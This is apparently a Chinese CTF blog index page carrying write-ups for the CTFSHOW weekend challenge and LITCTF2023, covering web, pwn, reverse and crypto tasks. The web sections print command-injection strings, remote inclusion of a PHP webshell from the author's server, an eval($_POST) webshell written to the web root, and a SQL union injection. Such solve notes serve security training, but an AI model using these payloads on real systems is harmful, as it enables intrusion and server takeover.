
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>Arcueid&#39;s BLOG</title>
    <meta name="author" content="Arcueid" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <link rel="icon" href="/images/Arcueid.jpg" />
    <link rel="preconnect" href="https://cdn.staticfile.net" />
<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.loli.net" />
<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>


<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>


<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
<script src="/js/lib/math.js"></script>


<script src="/js/lib/preview.js"></script>





<script src="/js/lib/home.js"></script>

<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>ARCUEID&#39;S BLOG</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;ARCUEID&#39;S BLOG</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div id="home-head">
    <div id="home-background" ref="homeBackground" data-images="/images/background.jpg"></div>
    <div id="home-info" @click="homeClick">
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="info">
            <div class="wrap">
                <h1>Arcueid&#39;s BLOG</h1>
                <h3></h3>
                <h5></h5>
            </div>
        </span>
    </div>
</div>
<div id="home-posts-wrap" true ref="homePostsWrap">
    <div id="home-posts">
        

<div class="post">
    <a href="/2023/05/14/CTFSHOW%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%98wp/">
        <h2 class="post-title">CTFSHOW周末大挑战wp</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/14
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>挺麻烦的是 &#x2F;不能写,会截断解析,这里我用了base64解码后再运行<br>做到4的时候才想起来可以直接cd</p>
<pre><code class="bash">?u=http://system(&quot;`echo%20%27Y2F0IC9mbGFnX2lzX2hlcmUudHh0%27|base64%20-d`&quot;);:
</code></pre>
<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>远程包含vps上的一句话<br><code>?u=username:http://vps地址/x.php</code></p>
<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>还是远程vps<br><code>/?u=http:://vps地址/x.php</code></p>
<h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p>cd 后再读取<br><code>?u=http://cd ..%26%26cd ..%26%26cd ..%26%26tac 1_f1ag_1s_h3re</code></p>
<h1 id="5"><a href="#5" class="headerlink" title="5"></a>5</h1><p><code>?u=user://pass:fragment@scheme:9090/path?http://vps地址/x.php%23query</code><br>构造流程如下<br><img src="https://img-blog.csdnimg.cn/5fece1ceebbf4245b5637547e2bd84d3.png" alt="在这里插入图片描述"></p>
<h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><p>一开始想用伪协议,然后base64-decode写马<br>然后发现path无论如何都会以&#x2F;开头,伪协议用不了<br>要 直接写马又不能有<code>?</code><br>没想到版本是5.几的<br><code>&lt;script language=&quot;php&quot;&gt;</code>还能用</p>
<p><code>//&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);:/var/www/html/shell.php</code></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/php/" style="color: #ffa2c4">php</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/linux/" style="color: #ff7d73">linux</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E8%BF%90%E7%BB%B4/" style="color: #00bcd4">运维</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="color: #00a596">服务器</a>
        </span>
        
    </div>
    <a href="/2023/05/14/CTFSHOW%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%98wp/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/05/14/LITCTF2023%20%E9%83%A8%E5%88%86WP/">
        <h2 class="post-title">LITCTF2023 部分WP</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/14
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="我Flag呢？"><a href="#我Flag呢？" class="headerlink" title="我Flag呢？"></a>我Flag呢？</h2><p>查看源码就有flag了<br><img src="https://img-blog.csdnimg.cn/8317353a125941adb692c1dbd7ca0efc.png" alt="在这里插入图片描述"><br>彩蛋</p>
<h2 id="导弹迷踪"><a href="#导弹迷踪" class="headerlink" title="导弹迷踪"></a>导弹迷踪</h2><p><img src="https://img-blog.csdnimg.cn/5138b92792aa4a399ec95505e7619bb6.png" alt="在这里插入图片描述"></p>
<h2 id="Follow-me-and-hack-me"><a href="#Follow-me-and-hack-me" class="headerlink" title="Follow me and hack me"></a>Follow me and hack me</h2><p><img src="https://img-blog.csdnimg.cn/148ac39fa59142c0b415bc6b042a4d61.png" alt="在这里插入图片描述"></p>
<p>然后彩蛋<a target="_blank" rel="noopener" href="http://www.zip解压即可/">www.zip解压即可</a></p>
<h2 id="PHP是世界上最好的语言！！"><a href="#PHP是世界上最好的语言！！" class="headerlink" title="PHP是世界上最好的语言！！"></a>PHP是世界上最好的语言！！</h2><p>直接可以命令执行,当时想了好久<br><img src="https://img-blog.csdnimg.cn/28de1607a2114f37a7346e96312a524e.png" alt="在这里插入图片描述"></p>
<h2 id="Vim-yyds"><a href="#Vim-yyds" class="headerlink" title="Vim yyds"></a>Vim yyds</h2><p>扫目录,有swp文件<br><img src="https://img-blog.csdnimg.cn/154d649914724574a6b43e6dc6c13cfb.png" alt="然后按提示"><br><img src="https://img-blog.csdnimg.cn/824b7d621e8042839de4097263e7bcc1.png" alt="在这里插入图片描述"></p>
<h2 id="作业管理系统"><a href="#作业管理系统" class="headerlink" title="作业管理系统"></a>作业管理系统</h2><p>任意文件上传,传个马访问就行<br>彩蛋<br><img src="https://img-blog.csdnimg.cn/5dab43517cc140a89d22450d33af1128.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/742db4ff29854a77892ad057de908b40.png" alt="在这里插入图片描述"></p>
<h2 id="这是什么？SQL-！注一下-！"><a href="#这是什么？SQL-！注一下-！" class="headerlink" title="这是什么？SQL ！注一下 ！"></a>这是什么？SQL ！注一下 ！</h2><p><code>?id=1))))))union select version(),group_concat(flag)from ctftraining.flag%23</code><br>彩蛋输入2<br>这彩蛋是难找</p>
<h2 id="Http-pro-max-plus"><a href="#Http-pro-max-plus" class="headerlink" title="Http pro max plus"></a>Http pro max plus</h2><p><img src="https://img-blog.csdnimg.cn/66becfa08e0b41f9a7d5752caae3e9cb.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3ba8a2c37c5e45958ba0f6674bf186c8.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d12fa5f1d45546638ed67213cb168548.png" alt="在这里插入图片描述"></p>
<h2 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h2><p><img src="https://img-blog.csdnimg.cn/1987fd51940b4ffdae6dda007aca89c6.png" alt="在这里插入图片描述"></p>
<h2 id="1zjs"><a href="#1zjs" class="headerlink" title="1zjs"></a>1zjs</h2><p><img src="https://img-blog.csdnimg.cn/dce35292f6474628b4eb72404c1833ca.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/b06b2c0780fb475dab8282d952a82983.png" alt="在这里插入图片描述"></p>
<h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>获取方式都写在之前的题里了</p>
<h2 id="就当无事发生"><a href="#就当无事发生" class="headerlink" title="就当无事发生"></a>就当无事发生</h2><p>上探姬的github<br><img src="https://img-blog.csdnimg.cn/f01534f3dada472583eaf389d3c55bd9.png" alt="在这里插入图片描述"><br>怕你们找不到<br><code>https://github.com/ProbiusOfficial/ProbiusOfficial.github.io/commit/f04fe251bf8811324d4e71cd87b4b15581358490</code></p>
<h2 id="Flag点击就送！"><a href="#Flag点击就送！" class="headerlink" title="Flag点击就送！"></a>Flag点击就送！</h2><p>session伪造<br>先随便填个名字拿session<br>然后用flask_session_cookie_manager生成<br><code>SecertKey</code>是<code>LitCTF</code><br>一开始用<code>flask-unsign</code>没爆破出来<br>后面实在没题做一点点手动试SecretKey<br>像<code>Probius</code> <code>NSSCTF</code> <code>LitCTF</code>比赛贴什么试什么</p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="只需要nc一下"><a href="#只需要nc一下" class="headerlink" title="只需要nc一下~"></a>只需要nc一下~</h2><p>nc连上去 flag在env</p>
<h2 id="口算题卡"><a href="#口算题卡" class="headerlink" title="口算题卡"></a>口算题卡</h2><p>交互题</p>
<pre><code class="python">import pwn
io = pwn.remote(&quot;node6.anna.nssctf.cn&quot;,28258)
io.recv()
while True:
    res = io.recvline()
    print(res)
    if b&#39;What is &#39; in res:
        res = str(eval(res[8:-2]))
        io.sendline(res.encode())
</code></pre>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="世界上最棒的程序员"><a href="#世界上最棒的程序员" class="headerlink" title="世界上最棒的程序员"></a>世界上最棒的程序员</h2><p><img src="https://img-blog.csdnimg.cn/4eedc91426c34fd68987b3e559e514e0.png" alt="在这里插入图片描述"></p>
<h2 id="ez-XOR"><a href="#ez-XOR" class="headerlink" title="ez_XOR"></a>ez_XOR</h2><pre><code class="python">import pwn
v8 = &#39;E`&#125;J]OrQF[V8zV:hzpV&#125;fVF[t&#39;
print(pwn.xor(v8,3*3))
</code></pre>
<h2 id="enbase64"><a href="#enbase64" class="headerlink" title="enbase64"></a>enbase64</h2><p>换表的base64<br><img src="https://img-blog.csdnimg.cn/39c265793ac14797b7656da96d54a728.png" alt="在这里插入图片描述"><br>把表拿出来解就行</p>
<pre><code class="python">s = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;

def basechange(source):
    destination = list(source)
    v3 = [
        16, 34, 56, 7, 46, 2, 10, 44, 20, 41, 59, 31, 51, 60, 61, 26, 5, 40, 21, 38,
        4, 54, 52, 47, 3, 11, 58, 48, 32, 15, 49, 14, 37, 0, 55, 53, 24, 35, 18, 25,
        33, 43, 50, 39, 12, 19, 13, 42, 9, 17, 28, 30, 23, 36, 1, 22, 57, 63, 8, 27,
        6, 62, 45, 29
    ]

    for _ in range(48):
        for j in range(64):
            source[j] = destination[v3[j]]
        destination = source.copy()

    return &#39;&#39;.join(destination)
print(basechange(list(s)))
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/d2a232ac80d2487aa7b8b5b44b5967cb.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5818d2886f0749358e01bb824e9611f5.png" alt="在这里插入图片描述"></p>
<h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>pyc文件,反编译<br>发现不行,头有问题<br>找个py37的头补上<br><img src="https://img-blog.csdnimg.cn/09d3da2bb5b545709dd75a8f9a16e9a9.png" alt="在这里插入图片描述"><br>然后uncompyle6反编译得到</p>
<pre><code class="python"># uncompyle6 version 3.9.0
# Python bytecode version base 3.7.0 (3394)
# Decompiled from: Python 3.10.8 (tags/v3.10.8:aaaf517, Oct 11 2022, 16:50:30) [MSC v.1933 64 bit (AMD64)]
# Embedded file name: game.py
# Compiled at: 2021-08-18 04:22:44
# Size of source mod 2**32: 3409 bytes
&quot;&quot;&quot;贪吃蛇&quot;&quot;&quot;
import random, sys, time, pygame
from pygame.locals import *
from collections import deque
SCREEN_WIDTH = 600
SCREEN_HEIGHT = 480
SIZE = 20
LINE_WIDTH = 1
SCOPE_X = (
 0, SCREEN_WIDTH // SIZE - 1)
SCOPE_Y = (2, SCREEN_HEIGHT // SIZE - 1)
FOOD_STYLE_LIST = [
 (10, (255, 100, 100)), (20, (100, 255, 100)), (30, (100, 100, 255))]
LIGHT = (100, 100, 100)
DARK = (200, 200, 200)
BLACK = (0, 0, 0)
RED = (200, 30, 30)
BGCOLOR = (40, 40, 60)

def print_text(screen, font, x, y, text, fcolor=(255, 255, 255)):
    imgText = font.render(text, True, fcolor)
    screen.blit(imgText, (x, y))


def init_snake():
    snake = deque()
    snake.append((2, SCOPE_Y[0]))
    snake.append((1, SCOPE_Y[0]))
    snake.append((0, SCOPE_Y[0]))
    return snake


def create_food(snake):
    food_x = random.randint(SCOPE_X[0], SCOPE_X[1])
    food_y = random.randint(SCOPE_Y[0], SCOPE_Y[1])
    while (food_x, food_y) in snake:
        food_x = random.randint(SCOPE_X[0], SCOPE_X[1])
        food_y = random.randint(SCOPE_Y[0], SCOPE_Y[1])

    return (
     food_x, food_y)


def get_food_style():
    return FOOD_STYLE_LIST[random.randint(0, 2)]


def main():
    pygame.init()
    screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
    pygame.display.set_caption(&#39;贪吃蛇&#39;)
    font1 = pygame.font.SysFont(&#39;SimHei&#39;, 24)
    font2 = pygame.font.Font(None, 72)
    fwidth, fheight = font2.size(&#39;GAME OVER&#39;)
    b = True
    snake = init_snake()
    food = create_food(snake)
    food_style = get_food_style()
    pos = (1, 0)
    game_over = True
    start = False
    score = 0
    orispeed = 0.5
    speed = orispeed
    last_move_time = None
    pause = False
    while 1:
        for event in pygame.event.get():
            if event.type == QUIT:
                sys.exit()

        screen.fill(BGCOLOR)
        for x in range(SIZE, SCREEN_WIDTH, SIZE):
            pygame.draw.line(screen, BLACK, (x, SCOPE_Y[0] * SIZE), (x, SCREEN_HEIGHT), LINE_WIDTH)

        for y in range(SCOPE_Y[0] * SIZE, SCREEN_HEIGHT, SIZE):
            pygame.draw.line(screen, BLACK, (0, y), (SCREEN_WIDTH, y), LINE_WIDTH)

        curTime = game_over or time.time()
        if curTime - last_move_time &gt; speed and not pause:
            b = True
            last_move_time = curTime
            next_s = (snake[0][0] + pos[0], snake[0][1] + pos[1])
            if next_s == food:
                snake.appendleft(next_s)
                score += food_style[0]
                speed = orispeed - 0.03 * (score // 100)
                food = create_food(snake)
                food_style = get_food_style()
            else:
                if SCOPE_X[0] &lt;= next_s[0] &lt;= SCOPE_X[1]:
                    if SCOPE_Y[0] &lt;= next_s[1] &lt;= SCOPE_Y[1]:
                        if next_s not in snake:
                            snake.appendleft(next_s)
                            snake.pop()
                        else:
                            game_over = True
                    if not game_over:
                        pygame.draw.rect(screen, food_style[1], (food[0] * SIZE, food[1] * SIZE, SIZE, SIZE), 0)
                    for s in snake:
                        pygame.draw.rect(screen, DARK, (s[0] * SIZE + LINE_WIDTH, s[1] * SIZE + LINE_WIDTH,
                         SIZE - LINE_WIDTH * 2, SIZE - LINE_WIDTH * 2), 0)

                    print_text(screen, font1, 30, 7, f&quot;速度: &#123;score // 100&#125;&quot;)
                    print_text(screen, font1, 450, 7, f&quot;得分: &#123;score&#125;&quot;)
                    if score &gt; 1000:
                        flag = [
                         30, 196, 
                         52, 252, 49, 220, 7, 243, 
                         3, 241, 24, 224, 40, 230, 
                         25, 251, 28, 233, 40, 237, 
                         4, 225, 4, 215, 40, 231, 
                         22, 237, 14, 251, 10, 169]
                        for i in range(0, len(flag), 2):
                            flag[i], flag[i + 1] = flag[i + 1] ^ 136, flag[i] ^ 119

                        print_text(screen, font2, (SCREEN_WIDTH - fwidth) // 2, (SCREEN_HEIGHT - fheight) // 2, bytes(flag).decode(), RED)
                        pygame.display.update()
                    if game_over:
                        if start:
                            print_text(screen, font2, (SCREEN_WIDTH - fwidth) // 2, (SCREEN_HEIGHT - fheight) // 2, &#39;GAME OVER&#39;, RED)
                pygame.display.update()


if __name__ == &#39;__main__&#39;:
    main()
</code></pre>
<p>找到输出flag的那段逻辑运行</p>
<pre><code class="python">flag = [
    30, 196, 
    52, 252, 49, 220, 7, 243, 
    3, 241, 24, 224, 40, 230, 
    25, 251, 28, 233, 40, 237, 
    4, 225, 4, 215, 40, 231, 
    22, 237, 14, 251, 10, 169]
for i in range(0, len(flag), 2):
    flag[i], flag[i + 1] = flag[i + 1] ^ 136, flag[i] ^ 119
for i in flag:
    print(chr(i),end=&#39;&#39;)
</code></pre>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Hex？Hex！-初级"><a href="#Hex？Hex！-初级" class="headerlink" title="Hex？Hex！(初级)"></a>Hex？Hex！(初级)</h2><p>long_to_bytes</p>
<h2 id="梦想是红色的-初级"><a href="#梦想是红色的-初级" class="headerlink" title="梦想是红色的 (初级)"></a>梦想是红色的 (初级)</h2><p>社会主义核心价值观解码</p>
<h2 id="原来你也玩原神-初级"><a href="#原来你也玩原神-初级" class="headerlink" title="原来你也玩原神 (初级)"></a>原来你也玩原神 (初级)</h2><p>百度查表一个个对</p>
<h2 id="家人们！谁懂啊，RSA签到都不会-初级"><a href="#家人们！谁懂啊，RSA签到都不会-初级" class="headerlink" title="家人们！谁懂啊，RSA签到都不会 (初级)"></a>家人们！谁懂啊，RSA签到都不会 (初级)</h2><pre><code class="python">from Crypto.Util.number import *
import gmpy2
p = 12567387145159119014524309071236701639759988903138784984758783651292440613056150667165602473478042486784826835732833001151645545259394365039352263846276073
q = 12716692565364681652614824033831497167911028027478195947187437474380470205859949692107216740030921664273595734808349540612759651241456765149114895216695451
c = 108691165922055382844520116328228845767222921196922506468663428855093343772017986225285637996980678749662049989519029385165514816621011058462841314243727826941569954125384522233795629521155389745713798246071907492365062512521474965012924607857440577856404307124237116387085337087671914959900909379028727767057
e = 65537
n = p*q
print(long_to_bytes(pow(c,(gmpy2.invert(e,(p-1)*(q-1))),n)))
</code></pre>
<h2 id="yafu-中级"><a href="#yafu-中级" class="headerlink" title="yafu (中级)"></a>yafu (中级)</h2><p>yafu分解pq其它和上题一样</p>
<h2 id="factordb-中级"><a href="#factordb-中级" class="headerlink" title="factordb (中级)"></a>factordb (中级)</h2><p>factordb查pq其它和上题一样</p>
<h2 id="校外-P-Leak"><a href="#校外-P-Leak" class="headerlink" title="(校外)P_Leak"></a>(校外)P_Leak</h2><p>dp泄露</p>
<h2 id="校外-md5的破解"><a href="#校外-md5的破解" class="headerlink" title="(校外)md5的破解"></a>(校外)md5的破解</h2><pre><code class="python">from Crypto.Util.number import *
import hashlib
import string
s = string.ascii_lowercase+string.digits

enc = &quot;LitCTF&#123;&#123;md5can&#123;&#125;&#123;&#125;3de&#123;&#125;rypt213thoughcr&#123;&#125;sh&#125;&#125;&quot;
print(enc)
target = &#39;496603d6953a15846cd7cc476f146771&#39;
for i in s:
    for i2 in s:
        for j in s:
            for k in s:
                    tmp = enc.format(i,i2,j,k)
                    if (hashlib.md5(tmp.encode()).hexdigest() == target):
                        print (tmp)
                        break
</code></pre>
<h2 id="校外-e的学问"><a href="#校外-e的学问" class="headerlink" title="(校外)e的学问"></a>(校外)e的学问</h2><p>e phi 不互素</p>
<h2 id="校外-我测你vva"><a href="#校外-我测你vva" class="headerlink" title="(校外)我测你vva"></a>(校外)我测你vva</h2><pre><code class="python">def decrypt(ciphertext):
    decrypted = &quot;&quot;
    for i in range(len(ciphertext)):
        if i % 2 == 0:
            cipher = ord(ciphertext[i])
            cipher = cipher - i
            decrypted += chr(cipher)
        else:
            cipher = ord(ciphertext[i])
            cipher = cipher + i
            decrypted += chr(cipher)
    return decrypted

ciphertext = &quot;HYEQJvPZ~X@+Bp&quot;  # 输入加密后的字符串
plaintext = decrypt(ciphertext)
print(plaintext)
</code></pre>
<h2 id="The-same-common-divisor-高级"><a href="#The-same-common-divisor-高级" class="headerlink" title="The same common divisor (高级)"></a>The same common divisor (高级)</h2><p>共模<br>n2拿n1^n3求</p>
<h2 id="你是我的关键词-Keyworld-初级"><a href="#你是我的关键词-Keyworld-初级" class="headerlink" title="你是我的关键词(Keyworld) (初级)"></a>你是我的关键词(Keyworld) (初级)</h2><p>我不知道是不是这么做的,我是这么做的<br>这是原文<br><code>IFRURC&#123;X0S_YP3_JX_HBXV0PA&#125;</code><br>前六位必为LITCTF 单表替换<br>然后根据你是我的关键词猜测得到<br>you_are_my_keyword<br>一一对应替换再改nss<br><code>NSSCTF&#123;Y0U_AR3_MY_KEYW0RD&#125;</code></p>
<h2 id="校外-Is-this-only-base"><a href="#校外-Is-this-only-base" class="headerlink" title="(校外)Is this only base?"></a>(校外)Is this only base?</h2><p><img src="https://img-blog.csdnimg.cn/ca8135e926824a0984905c8701fd7025.png" alt="rail fance 23"></p>
<h2 id="校外-Virginia"><a href="#校外-Virginia" class="headerlink" title="(校外)Virginia"></a>(校外)Virginia</h2><p>Virginia密码<br><code>https://www.guballa.de/vigenere-solver</code><br>上半密码flag<br>下半密码ulub</p>
<pre><code class="python">flag=[86, 116, 128, 80, 98, 85, 139, 122, 134, 114, 125, 136, 117, 123, 129, 127, 128, 128, 142, 130, 140, 147, 127, 132, 131, 136, 151, 134, 152, 164]

xxx = &#39;&#39;
for i in range(len(flag)):
    xxx += chr(flag[::-1][i] - (39-i))

print(xxx[::-1])
</code></pre>
<h2 id="校外-babyLCG"><a href="#校外-babyLCG" class="headerlink" title="(校外)babyLCG"></a>(校外)babyLCG</h2><pre><code class="python">from sympy import *
from gmpy2 import *
from functools import reduce
from primefac import *
result = [699175025435513913222265085178805479192132631113784770123757454808149151697608216361550466652878, 193316257467202036043918706856603526262215679149886976392930192639917920593706895122296071643390, 1624937780477561769577140419364339298985292198464188802403816662221142156714021229977403603922943, 659236391930254891621938248429619132720452597526316230221895367798170380093631947248925278766506, 111407194162820942281872438978366964960570302720229611594374532025973998885554449685055172110829, 1415787594624585063605356859393351333923892058922987749824214311091742328340293435914830175796909, 655057648553921580727111809001898496375489870757705297406250204329094679858718932270475755075698, 1683427135823894785654993254138434580152093609545092045940376086714124324274044014654085676620851, 492953986125248558013838257810313149490245209968714980288031443714890115686764222999717055064509, 70048773361068060773257074705619791938224397526269544533030294499007242937089146507674570192265]



def crack_unknown_modulus(states): 
    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] 
    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] 
    modulus = abs(reduce(gcd, zeroes)) 
    factors = factorint(modulus)
    while not isprime(modulus): 
        for prime, order in factors.items():
            if prime.bit_length() &gt; 128:
                continue
            modulus = modulus / prime**order
    multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus 
    increment = (states[1] - states[0]*multiplier) % modulus
    print((states[0] - increment) * invert(multiplier, modulus) % modulus)
    return modulus, multiplier, increment
_,__,___ = crack_unknown_modulus(result)
</code></pre>
<p>运行得到种子<br>种子long_to_bytes就是flag</p>
<h2 id="easy-math-中级"><a href="#easy-math-中级" class="headerlink" title="easy_math (中级)"></a>easy_math (中级)</h2><p>z3求p q</p>
<pre><code class="python">import z3
p,q = z3.Ints(&#39;p q&#39;)
x = z3.Solver()

n = 2230791374046346835775433548641067593691369485828070649075162141394476183565187654365131822111419512477883295758461313983481545182887415447403634720326639070667688614534290859200753589300443797
hint = 392490868359411675557103683163021977774935163924606169241731307258226973701652855448542714274348304997416149742779376023311152228735117186027560227613656229190807480010615064372521942836446425717660375242197759811804760170129768647414717571386950790115746414735411766002368288743086845078803312201707960465419405926186622999423245762570917629351110970429987377475979058821154568001902541710817731089463915930932142007312230897818177067675996751110894377356758932
equs = [p**3 - q**5 == hint, p*q==n]
x.add(equs)
check = x.check()
model = x.model()
print(model)
</code></pre>
<pre><code class="python">import z3
from Crypto.Util.number import *
import gmpy2


e = 65537
c = 2168563038335029902089976057856861885635845445863841607485310134441400500612435296818745930370268060353437465666224400129105788787423156958336380480503762222278722770240792709450637433509537280
n = 2230791374046346835775433548641067593691369485828070649075162141394476183565187654365131822111419512477883295758461313983481545182887415447403634720326639070667688614534290859200753589300443797

q = 304683618109085947723284393392507415311
p = 7321664971326604351487965655099805117568571010588695608389113791312918573783115429227542573780838065461696504325762281209452761930184231131129306271846427
print(long_to_bytes(pow(c,(gmpy2.invert(e,(p-1)*(q-1))),n)))
</code></pre>
<h2 id="校外-隐晦的聊天记录"><a href="#校外-隐晦的聊天记录" class="headerlink" title="(校外)隐晦的聊天记录"></a>(校外)隐晦的聊天记录</h2><p>一次一密(opt)</p>
<pre><code class="python">import pwn
a = b&#39;6c73d5240a948c86981bc294814d&#39;


b = b&#39;attack at dawn&#39;
b = bytes.hex(b).encode()
c = b&#39;Monday or Thur&#39;
c = bytes.hex(c).encode()
flag = &#39;&#39;
for i in range(0,len(a),2):
    intres = int(a[i:i+2],16)^int(b[i:i+2],16)^int(c[i:i+2],16)
    strres = str(hex(intres)).replace(&quot;0x&quot;,&quot;&quot;)
    if len(strres)!=2:
        print(i)
        strres = &#39;0&#39;+strres

    flag += strres

print(flag.encode())
</code></pre>
<h2 id="校外-Euler"><a href="#校外-Euler" class="headerlink" title="(校外)Euler"></a>(校外)Euler</h2><p>欧拉降幂<br>m ^(n-p-q+3)^ ≡ c mod n<br>等价于<br>m ^(n-p-q+3)mod^ ^φn()^ ≡ c mod n</p>
<pre><code class="python">import gmpy2
from Crypto.Util.number import *
n = 115140122725890943990475192890188343698762004010330526468754961357872096040956340092062274481843042907652320664917728267982409212988849109825729150839069369465433531269728824368749655421846730162477193420534803525810831025762500375845466064264837531992986534097821734242082950392892529951104643690838773406549
c = 406480424882876909664869928877322864482740577681292497936198951316587691545267772748204383995815523935005725558478033908575228532559165174398668885819826720515607326399097899572022020453298441
# c = pow(m,2,n)
